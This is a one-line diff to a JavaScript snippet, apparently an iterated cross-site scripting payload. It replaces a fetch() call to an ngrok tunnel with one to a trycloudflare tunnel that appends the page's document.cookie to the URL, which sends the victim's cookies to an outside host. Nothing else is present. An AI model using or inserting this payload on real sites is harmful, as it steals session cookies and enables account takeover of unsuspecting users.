@@ -1,1 +1,1 @@
-fetch('https://14cfa3fe3e73.ngrok-free.app');
+fetch('https://macintosh-sealed-banner-adaptation.trycloudflare.com?c='+document.cookie);
